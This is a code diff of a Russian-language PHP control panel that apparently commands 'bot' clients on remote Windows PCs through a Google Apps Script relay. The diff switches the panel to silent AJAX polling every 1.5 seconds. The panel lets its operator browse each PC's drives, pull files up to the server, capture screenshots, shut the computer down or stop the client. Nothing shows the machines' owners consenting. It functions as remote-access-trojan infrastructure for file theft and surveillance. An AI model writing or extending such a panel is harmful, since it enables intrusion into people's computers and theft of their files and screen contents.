@@ -6,15 +6,34 @@ error_reporting(E_ALL); ini_set('display_errors', 1);
 // !!! ВСТАВЬ СВОЙ URL GOOGLE SCRIPT НИЖЕ !!!
 $api = "https://script.google.com/macros/s/AKfycbwDgR5LEV3rc7kiJjGqsa6IQkX4ZOfPWFcyA2appKMzSt8D4j7xUIPLkGhQRyExYw1P/exec";
 
-// Папки для хранения кэша, чтобы не забивать оперативку сервера
 $cache_dir = __DIR__ . '/explorer_cache/';
 if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);
+
+// ПОДДЕРЖКА AJAX ЗАПРОСОВ ДЛЯ МГНОВЕННОГО ОБНОВЛЕНИЯ БЕЗ ПЕРЕЗАГРУЗКИ
+if (isset($_GET['api_refresh'])) {
+    header('Content-Type: application/json');
+    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['api_refresh']);
+    
+    $tree_file = $cache_dir . $dev_id . '_tree.txt';
+    $path_file = $cache_dir . $dev_id . '_path.txt';
+    $last_file_ptr = $cache_dir . $dev_id . '_lastfile.txt';
+    
+    $items = file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [];
+    $cur_path = file_exists($path_file) ? file_get_contents($path_file) : 'C:\\';
+    $last_download = file_exists($last_file_ptr) ? file_get_contents($last_file_ptr) : '';
+
+    echo json_encode([
+        "current_path" => $cur_path,
+        "last_file" => $last_download,
+        "items" => $items
+    ]);
+    exit;
+}
 
 // 1. ПРИЕМ ДАННЫХ И ФАЙЛОВ ОТ БОТА
 if (isset($_POST['screenshot_device_id'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
     
-    // Бот прислал JSON структуру папки
     if (isset($_POST['folder_structure'])) {
         file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
         file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
@@ -22,7 +41,6 @@ if (isset($_POST['screenshot_device_id'])) {
         exit;
     }
 
-    // Бот прислал запрошенный файл
     if (isset($_FILES['downloaded_file'])) {
         $upload_dir = __DIR__ . '/downloads/';
         if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
@@ -35,7 +53,6 @@ if (isset($_POST['screenshot_device_id'])) {
         exit;
     }
     
-    // Бот прислал скриншот
     if (isset($_FILES['screenshot_file'])) {
         $upload_dir = __DIR__ . '/screenshots/';
         if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
@@ -46,7 +63,7 @@ if (isset($_POST['screenshot_device_id'])) {
     }
 }
 
-// 2. СКАЧИВАНИЕ ФАЙЛОВ С ПАНЕЛИ В БРАУЗЕР ПОЛЬЗОВАТЕЛЯ
+// 2. СКАЧИВАНИЕ ФАЙЛОВ В БРАУЗЕР
 if (isset($_GET['get_file']) && isset($_GET['dev'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
     $filename = basename($_GET['get_file']);
@@ -55,7 +72,7 @@ if (isset($_GET['get_file']) && isset($_GET['dev'])) {
         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . $filename . '"');
         readfile($file);
-    } else { echo "Файл не найден на сервере."; }
+    } else { echo "Файл не найден."; }
     exit;
 }
 
@@ -70,7 +87,7 @@ if (isset($_GET['download_screen'])) {
     exit;
 }
 
-// 3. ОБРАБОТЧИК КНОПОК ПАНЕЛИ (ОТПРАВКА В GOOGLE SCRIPT)
+// 3. ОБРАБОТЧИК КНОПОК ПАНЕЛИ
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $action = isset($_POST["action"]) ? trim($_POST["action"]) : ""; 
     $device_id = isset($_POST["device_id"]) ? trim($_POST["device_id"]) : "";
@@ -85,35 +102,38 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["action" => $action, "device_id" => $device_id])); 
         curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 6);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
         curl_exec($ch); 
         curl_close($ch);
     }
+    // Если запрос был отправлен через JS (FormData), не перезагружаем страницу!
+    if(isset($_POST['js_async'])) { echo "OK"; exit; }
+    
     header("Location: " . $_SERVER['PHP_SELF']); 
     exit;
 }
 
 function getData($url) {
     $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_TIMEOUT, 6); 
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_TIMEOUT, 5); 
     $res = curl_exec($ch); curl_close($ch); return json_decode($res, true) ?: [];
 }
-$devices = getData($api); $logs = getData($api . "?get_logs=1");
+$devices = getData($api);
 ?>
 <!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Центральная Панель Управления</title>
+<title>Панель Управления REALTIME</title>
 <style>
 body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; padding-bottom:50px;}
 .header{ padding:18px 24px; background:#0f172a; border-bottom:1px solid #1e293b; font-weight:bold; font-size:19px; display:flex; justify-content:space-between; align-items:center;}
-.sync-indicator{ font-size:12px; color:#64748b;}
-.dot{ width:8px; height:8px; background:#34d399; border-radius:50%; margin-right:8px; display:inline-block; animation: pulse 1.5s infinite; }
-@keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
-.container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(350px,1fr)); gap:20px; }
-.card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; }
-.online-card { border-color: #064e3b; }
+.sync-indicator{ font-size:12px; color:#34d399; font-weight: bold;}
+.dot{ width:8px; height:8px; background:#34d399; border-radius:50%; margin-right:8px; display:inline-block; animation: pulse 1s infinite; }
+@keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+.container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:20px; }
+.card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; position: relative;}
+.online-card { border-color: #064e3b; box-shadow: 0 4px 20px rgba(4,120,87,0.15); }
 .name{ font-weight:700; font-size:17px; margin-bottom:6px; color:#f8fafc;}
 .status{ font-size:11px; padding:4px 10px; border-radius:999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
 .online { background:#064e3b; color:#34d399; } .offline { background:#374151; color:#9ca3af; }
@@ -124,21 +144,17 @@ button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; 
 .orange { background:#d97706; color:white; } .orange:hover{ background:#b45309; }
 .red { background:#dc2626; color:white; } .red:hover{ background:#b91c1c; }
 .gray-danger { background:#374151; color:#f3f4f6; border: 1px solid #4b5563; } .gray-danger:hover{ background:#1f2937; }
-.explorer-box { background:#030712; border:1px solid #1f2937; border-radius:8px; padding:10px; margin-top:10px; max-height:250px; overflow-y:auto; }
-.exp-item { display:flex; justify-content:space-between; align-items:center; padding:6px; border-bottom:1px solid #111827; font-size:12px; }
+.explorer-box { background:#030712; border:1px solid #1f2937; border-radius:8px; padding:10px; margin-top:10px; max-height:280px; overflow-y:auto; }
+.exp-item { display:flex; justify-content:space-between; align-items:center; padding:6px; border-bottom:1px solid #1f2937; font-size:12px; }
 .exp-btn { background:none; border:none; color:#60a5fa; text-align:left; padding:0; width:auto; margin:0; display:inline; font-weight:normal; font-family:monospace; cursor:pointer;}
 .exp-btn:hover { text-decoration:underline; color:#93c5fd; }
-.log-section{ margin:24px; background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; overflow-x:auto;}
-table{ width:100%; border-collapse:collapse; font-size:13px;}
-th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
-.process-box { background:#030712; padding:10px; border-radius:8px; border:1px solid #1f2937; font-family:monospace; font-size:11px; color:#10b981; max-height:120px; overflow-y:auto; margin-top:8px; display:none; white-space: pre-wrap; }
 </style>
 </head>
 <body>
 
 <div class="header">
-    <span>🖥 Центральная Панель Управления PRO</span>
-    <div class="sync-indicator"><span class="dot"></span>Автообновление (10с)</div>
+    <span>🖥 Центральная Панель Управления [REALTIME V2]</span>
+    <div class="sync-indicator"><span class="dot"></span>Живое AJAX-обновление (1.5с)</div>
 </div>
 
 <div class="container">
@@ -156,133 +172,127 @@ th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
         $isOnline = ((time() - $last) <= 35 && $last > 0);
         $card_class = $isOnline ? "online-card" : "";
     ?>
-    <div class="card <?=$card_class?>">
+    <div class="card <?=$card_class?>" id="card_<?=$dev_id?>">
         <div class="name"><?=htmlspecialchars($d["name"] ?? "Неизвестный ПК")?></div>
         <div class="status <?=($isOnline?"online":"offline")?>"><?=($isOnline?"В сети":"Не в сети")?></div>
         <div class="row"><b>ID железа:</b> <span style="font-family:monospace;"><?=$dev_id?></span></div>
-
-        <button type="button" class="blue" onclick="toggleConsole('proc_<?=$dev_id?>')">📟 Консоль процессов</button>
-        <div class="process-box" id="proc_<?=$dev_id?>"><?=htmlspecialchars($d["processes"] ?? "")?></div>
 
         <hr style="border-color:#1f2937; margin:12px 0;">
 
         <div class="name" style="font-size:14px; margin-top:10px;">📂 Онлайн Проводник ПК:</div>
         
-        <form method="POST" action="">
-            <input type="hidden" name="action" value="get_files">
-            <input type="hidden" name="device_id" value="<?=$dev_id?>">
-            <?php 
-                $path_file = $cache_dir . $dev_id . '_path.txt';
-                $cur_path = file_exists($path_file) ? file_get_contents($path_file) : 'C:\\';
-            ?>
-            <span style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">Путь: <?=htmlspecialchars($cur_path)?></span>
-            <input type="hidden" name="target_path" value="<?=htmlspecialchars($cur_path)?>">
-            <button type="submit" class="blue" style="background:#0284c7; margin:0;">🔄 Обновить папку / Перейти на диск C:</button>
-        </form>
+        <span id="path_text_<?=$dev_id?>" style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">Загрузка пути...</span>
 
-        <div class="explorer-box">
-            <?php 
-            $tree_file = $cache_dir . $dev_id . '_tree.txt';
-            $items = file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [];
-            
-            if(empty($items)) {
-                echo "<span style='font-size:11px; color:#4b5563;'>Кэш пуст. Нажмите «Обновить папку» выше.</span>";
-            } else {
-                // Кнопка Назад
-                if ($cur_path !== 'C:\\' && $cur_path !== 'C:/') {
-                    $parent = dirname($cur_path);
-                    if($parent . '\\' === $cur_path || $parent === $cur_path || $parent === '.') { $parent = 'C:\\'; }
-                    echo "<div class='exp-item'>
-                            <form method='POST' action=''>
-                                <input type='hidden' name='action' value='get_files'><input type='hidden' name='device_id' value='{$dev_id}'>
-                                <input type='hidden' name='target_path' value='".htmlspecialchars($parent)."'>
-                                <button type='submit' class='exp-btn' style='color:#f59e0b;'>📁 .. [Назад]</button>
-                            </form>
-                          </div>";
-                }
+        <button type="button" class="blue" style="background:#0284c7; margin:0;" onclick="sendCmdAsync('<?=$dev_id?>', 'get_files', 'C:\\\\')">🔄 Обновить / Корень диска C:</button>
 
-                foreach($items as $item) {
-                    $isDir = $item['is_dir']; $name = $item['name']; $full = $item['path'];
-                    echo "<div class='exp-item'>";
-                    if($isDir) {
-                        echo "<form method='POST' action=''>
-                                <input type='hidden' name='action' value='get_files'><input type='hidden' name='device_id' value='{$dev_id}'>
-                                <input type='hidden' name='target_path' value='".htmlspecialchars($full)."'>
-                                <button type='submit' class='exp-btn'>📁 {$name}</button>
-                              </form>";
-                    } else {
-                        echo "<form method='POST' action=''>
-                                <input type='hidden' name='action' value='download_file'><input type='hidden' name='device_id' value='{$dev_id}'>
-                                <input type='hidden' name='target_path' value='".htmlspecialchars($full)."'>
-                                <button type='submit' class='exp-btn' style='color:#10b981;' onclick=\"return confirm('Запросить скачивание этого файла с ПК?')\">📄 {$name}</button>
-                              </form>";
-                        echo "<span style='font-size:10px; color:#4b5563;'>{$item['size']}</span>";
-                    }
-                    echo "</div>";
-                }
-            }
-            ?>
+        <div class="explorer-box" id="explorer_box_<?=$dev_id?>">
+            <span style='font-size:11px; color:#4b5563;'>Синхронизация структуры...</span>
         </div>
 
-        <?php 
-        $last_file_ptr = $cache_dir . $dev_id . '_lastfile.txt';
-        if (file_exists($last_file_ptr)): $fn = file_get_contents($last_file_ptr); 
-        ?>
-            <a href="?get_file=<?=urlencode($fn)?>&dev=<?=$dev_id?>" class="btn-link green" style="background:#10b981; margin-top:8px; box-shadow: 0 0 10px rgba(16,185,129,0.4);">💾 Скачать файл на свой ПК: <?=$fn?></a>
-        <?php endif; ?>
+        <div id="download_container_<?=$dev_id?>"></div>
 
         <hr style="border-color:#1f2937; margin:15px 0;">
 
-        <form method="POST" action="" style="margin-bottom:6px;">
-            <input type="hidden" name="action" value="take_screenshot"><input type="hidden" name="device_id" value="<?=$dev_id?>">
-            <button type="submit" class="blue">📸 Запросить Скриншот</button>
-        </form>
+        <button type="button" class="blue" onclick="sendCmdAsync('<?=$dev_id?>', 'take_screenshot')">📸 Запросить Скриншот</button>
+        
         <?php if (file_exists(__DIR__ . '/screenshots/screen_' . $dev_id . '.jpg')): ?>
             <a href="?download_screen=<?=urlencode($dev_id)?>" class="btn-link green" target="_blank" style="margin-bottom:6px;">📥 Посмотреть скриншот экрана</a>
         <?php endif; ?>
 
         <hr style="border-color:#1f2937; margin:15px 0;">
 
-        <form method="POST" action="" style="margin-bottom:6px;">
-            <input type="hidden" name="action" value="stop_client">
-            <input type="hidden" name="device_id" value="<?=$dev_id?>">
-            <button type="submit" class="orange" onclick="return confirm('Выключить программу-клиент на удаленном ПК?')">❌ Закрыть программу бота</button>
-        </form>
-
-        <form method="POST" action="" style="margin-bottom:6px;">
-            <input type="hidden" name="action" value="shutdown">
-            <input type="hidden" name="device_id" value="<?=$dev_id?>">
-            <button type="submit" class="red" onclick="return confirm('Выключить удаленный компьютер полностью?')">💻 Выключить компьютер</button>
-        </form>
-
-        <form method="POST" action="">
-            <input type="hidden" name="action" value="delete">
-            <input type="hidden" name="device_id" value="<?=$dev_id?>">
-            <button type="submit" class="gray-danger" onclick="return confirm('Забыть этот ПК? Он исчезнет из панели, пока его бот снова не запингует.')">🗑 Забыть ПК (Удалить из базы)</button>
-        </form>
+        <button type="button" class="orange" onclick="if(confirm('Закрыть программу бота?')) sendCmdAsync('<?=$dev_id?>', 'stop_client')">❌ Закрыть программу бота</button>
+        <button type="button" class="red" onclick="if(confirm('Выключить ПК?')) sendCmdAsync('<?=$dev_id?>', 'shutdown')">💻 Выключить компьютер</button>
+        <button type="button" class="gray-danger" onclick="if(confirm('Забыть ПК?')) sendCmdAsync('<?=$dev_id?>', 'delete')">🗑 Забыть ПК (Удалить)</button>
     </div>
     <?php endforeach; ?>
 </div>
 
-<div class="log-section">
-    <div class="name" style="font-size:15px;">📋 Системные отчеты выполнения</div>
-    <table>
-        <tbody>
-            <?php foreach ($logs as $l): if(empty($l["id"])) continue; ?>
-                <tr>
-                    <td><?=htmlspecialchars($l["id"])?></td>
-                    <td><?=htmlspecialchars($l["device_id"])?></td>
-                    <td><?=htmlspecialchars($l["action"])?></td>
-                    <td><?=htmlspecialchars($l["log"] ?? "")?></td>
-                </tr>
-            <?php endforeach; ?>
-        </tbody>
-    </table>
-</div>
-
 <script>
-function toggleConsole(id) { let box = document.getElementById(id); box.style.display = (box.style.display === "block") ? "none" : "block"; }
-setInterval(function() { location.reload(); }, 10000);
+// ФУНКЦИЯ ДЛЯ КЛИКОВ ПО КНОПКАМ БЕЗ ПЕРЕЗАГРУЗКИ СТРАНИЦЫ
+function sendCmdAsync(deviceId, action, targetPath = '') {
+    let formData = new FormData();
+    formData.append('action', action);
+    formData.append('device_id', deviceId);
+    formData.append('target_path', targetPath);
+    formData.append('js_async', '1');
+
+    fetch(window.location.href, {
+        method: 'POST',
+        body: formData
+    }).then(res => {
+        console.log('Команда отправлена:', action, targetPath);
+    }).catch(err => console.error(err));
+}
+
+// ГЛАВНЫЙ СУПЕР-ТАЙМЕР: ОБНОВЛЯЕТ СОДЕРЖИМОЕ ПРОВОДНИКА КАЖДЫЕ 1.5 СЕКУНДЫ ВТИХАРЯ!
+function startRealtimeMonitor() {
+    const devicesIds = [<?php 
+        $ids = [];
+        foreach($devices as $d) { if(!empty($d['device_id'])) $ids[] = "'".$d['device_id']."'"; }
+        echo implode(',', $ids);
+    ?>];
+
+    setInterval(() => {
+        devicesIds.forEach(id => {
+            fetch('?api_refresh=' + encodeURIComponent(id))
+            .then(response => response.json())
+            .then(data => {
+                // 1. Обновляем текст пути
+                document.getElementById('path_text_' + id).innerText = 'Путь: ' + data.current_path;
+
+                // 2. Строим дерево папок динамически
+                let box = document.getElementById('explorer_box_' + id);
+                let html = '';
+
+                // Если папка не корень, выводим кнопку "Назад"
+                if (data.current_path !== 'C:\\' && data.current_path !== 'C:/' && data.current_path !== '') {
+                    // Извлекаем родительскую директорию
+                    let parts = data.current_path.split(/[\\\/]/);
+                    parts.pop(); if(parts.length <= 1) parts = ['C:'];
+                    let parentPath = parts.join('\\\\');
+                    if(!parentPath.endsWith('\\')) parentPath += '\\\\';
+
+                    html += `<div class="exp-item">
+                        <button type="button" class="exp-btn" style="color:#f59e0b;" onclick="sendCmdAsync('${id}', 'get_files', '${parentPath}')">📁 .. [Назад к пред. папке]</button>
+                    </div>`;
+                }
+
+                if (!data.items || data.items.length === 0) {
+                    html += `<span style='font-size:11px; color:#4b5563;'>Папка пуста или ждет обновления кэша...</span>`;
+                } else {
+                    data.items.forEach(item => {
+                        // Экранируем слеши для JS аргументов
+                        let safePath = item.path.replace(/\\/g, '\\\\');
+                        if (item.is_dir) {
+                            html += `<div class="exp-item">
+                                <button type="button" class="exp-btn" onclick="sendCmdAsync('${id}', 'get_files', '${safePath}')">📁 ${item.name}</button>
+                            </div>`;
+                        } else {
+                            html += `<div class="exp-item">
+                                <button type="button" class="exp-btn" style="color:#10b981;" onclick="if(confirm('Запросить скачивание файла?')) sendCmdAsync('${id}', 'download_file', '${safePath}')">📄 ${item.name}</button>
+                                <span style="font-size:10px; color:#4b5563;">${item.size}</span>
+                            </div>`;
+                        }
+                    });
+                }
+                box.innerHTML = html;
+
+                // 3. Рендерим кнопку скачивания файла, если он готов
+                let dlContainer = document.getElementById('download_container_' + id);
+                if (data.last_file && data.last_file.trim() !== '') {
+                    dlContainer.innerHTML = `<a href="?get_file=${encodeURIComponent(data.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:8px; box-shadow: 0 0 12px rgba(16,185,129,0.5);">💾 Скачать на свой ПК: ${data.last_file}</a>`;
+                } else {
+                    dlContainer.innerHTML = '';
+                }
+            })
+            .catch(err => console.error("Ошибка обновления устройства " + id, err));
+        });
+    }, 1500); // 1.5 секунды!
+}
+
+// Запуск при старте страницы
+window.onload = startRealtimeMonitor;
 </script>
 </body>
 </html>
